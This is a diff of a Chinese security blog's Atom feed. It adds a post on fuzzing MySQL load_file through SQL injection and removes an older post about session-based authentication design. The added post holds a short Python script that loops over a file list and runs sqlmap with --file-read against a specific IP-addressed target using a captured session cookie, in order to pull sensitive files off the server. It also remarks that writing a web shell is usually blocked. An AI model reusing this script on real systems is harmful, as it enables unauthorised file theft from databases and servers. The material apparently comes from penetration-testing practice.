@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-03-28T09:15:37.000Z</updated>
+  <updated>2016-04-05T06:22:18.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[sql注入load_file fuzz]]></title>
+    <link href="http://xdxd.love/2016/04/05/sql%E6%B3%A8%E5%85%A5load-file-fuzz/"/>
+    <id>http://xdxd.love/2016/04/05/sql注入load-file-fuzz/</id>
+    <published>2016-04-05T06:06:16.000Z</published>
+    <updated>2016-04-05T06:22:18.000Z</updated>
+    <content type="html"><![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
+<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.blog.163.com/blog/static/186094195201322811145735/" target="_blank" rel="external">SQLNuke——mysql 注入load_file Fuzz工具</a>.</p>
+<p>不过sqlnuke看说明只支持回显的union的的方式。写一个下脚本用sqlmap来fuzz load_file也是一个不错的方式。</p>
+<pre><code><span class="comment">#!/usr/bin/env python</span>
+<span class="comment"># encoding: utf-8</span>
+import subprocess
+filepaths = <span class="keyword">open</span>(<span class="string">'filelist.txt'</span>)
+<span class="keyword">for</span> filepath in filepaths:
+    cmdline = <span class="string">"python /Users/xxxxxx/security/web/sqlmap/sqlmap.py -u 'http://1.1.25.41/cms/privilege/publist?level=3&amp;title=jj' --cookie='_pss=PcqD<span class="variable">%2BvOIi05CQLYgBqHVE</span><span class="variable">%2Bm9oeAswCYOYYyZZTA0b4wk8KUMrHTuBJmyyZdqch</span><span class="variable">%2Fpwd</span><span class="variable">%2F7QcVCaehUtF0QHhpgkJliaAruL0dxGR</span><span class="variable">%2B8mwM0</span><span class="variable">%2FGc</span><span class="variable">%3D</span>' --batch --file-read="</span> +filepath
+    fuzzsqlmap_proc = subprocess.Popen(cmdline,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    <span class="keyword">print</span> filepath
+    process_output = fuzzsqlmap_proc.stdout.readlines()
+    <span class="keyword">print</span> process_output
+</code></pre><p>使用python，几行代码就可以搞定。然后到sqlmap输出目录里根据文件大小查看下载下来的文件就可以了。感觉，根据目标系统的环境，搭建一个一样的系统，然后列出所有的文件作为字典来进行fuzz应该是一个不错的思路。</p>
+<p>尝试load_file(目录)，返回为null，如果可以load_file目录的话~~</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>在linux系统上即使mysql有文件权限，由于目录权限的问题，一般也没法写shell。只能通过读文件来获取敏感信息。</p>
+<p>SQLNuke就是一个fuzz load_file的工具。详细的使用说明可以参考：<a href="http://danqingdani.b]]>
+    </summary>
+    
+      <category term="sql注入" scheme="http://xdxd.love/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[bugfree任意文件上传漏洞]]></title>
@@ -902,34 +935,6 @@ print binascii.<span class="function"><span class="title">crc32</span><span clas
       <category term="保险箱" scheme="http://xdxd.love/tags/%E4%BF%9D%E9%99%A9%E7%AE%B1/"/>
     
       <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[无状态协议中认证状态保持方案的一些思考]]></title>
-    <link href="http://xdxd.love/2016/01/07/%E6%97%A0%E7%8A%B6%E6%80%81%E5%8D%8F%E8%AE%AE%E4%B8%AD%E8%AE%A4%E8%AF%81%E7%8A%B6%E6%80%81%E4%BF%9D%E6%8C%81%E6%96%B9%E6%A1%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
-    <id>http://xdxd.love/2016/01/07/无状态协议中认证状态保持方案的一些思考/</id>
-    <published>2016-01-07T03:12:42.000Z</published>
-    <updated>2016-01-11T09:03:14.000Z</updated>
-    <content type="html"><![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
-<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/Login" target="_blank" rel="external">login维基百科</a>上解释是一个用户通过认证获得一个系统的访问权限的过程。感觉更多的是一种业务上的描述，在讨论安全架构设计的时候都是使用identity,authentication等词语描述。</p>
-<h1 id="何为认证_authentication">何为认证 authentication</h1><h1 id="不同的认证方式">不同的认证方式</h1><p>认证有不少协议，参考<a href="https://en.wikipedia.org/wiki/Basic_access_authentication" target="_blank" rel="external">Basic access authentication</a></p>
-<h1 id="最常见的情形">最常见的情形</h1><p>在web应用中，通常都是web表单提交用户名密码的方式实现登陆。登陆之后，服务端会写一些信息到cookie中，以后的访问通过cookie中的信息来识别该请求的来源用户身份。</p>
-<p>在比较早的应用中还可以看到服务端将用户名和密码保存在cookie中，服务端对每个请求，都会验证验证cookie中的用户名和密码是否正确。这种实现方案虽然在功能上实现了保持用户的身份状态。但是有比较高的安全风险。现在基本上很少见这种实现了。</p>
-<p>目前最常见的两种方式，一种是使用sessionID的方式来跟踪用户，一种是将加密后的用户id或者用户id和密码保存在cookie中。以前我一直以为使用sessionID的方式才是最佳实践，把用户信息加密之后放在客户端是一种违背了安全设计思路的事情。但是看到<a href="http://drops.wooyun.org/papers/1449" target="_blank" rel="external">Codeigniter</a>作为流行的框架，也是采用了这种设计。</p>
-<p>其实仔细思考一下，可以认为这是两种不同的设计方式，各有优劣，只要设计得当，都可以做到安全。采用sessionid的方式一定要有一个集中的管理session数据的中心，而采用加密算法的方式可以认为是将数据查询的过程转化成了cpu操作的加解密。这样子就不需要依赖集中的数据中心可以方便的实现分布式。</p>
-<p>使用sessionid的方式，需要一个中心管理session数据<br><img src="/images/denglu1.png" alt=""></p>
-<p>使用加解密用户数据的方式维持登录状态不需要数据查询，只需要cpu加解密操作就可以。</p>
-<p><img src="/images/denglu2.png" alt=""></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>给文章起了一个高大上的名字，主要是想写一下对于http协议中用户登陆之后，如何进行用户身份跟踪，以及不同的实现方案可能存在的安全问题。</p>
-<h1 id="何为登陆">何为登陆</h1><p><a href="https://en.wikipedia.org/wiki/]]>
-    </summary>
-    
-      <category term="sso" scheme="http://xdxd.love/tags/sso/"/>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
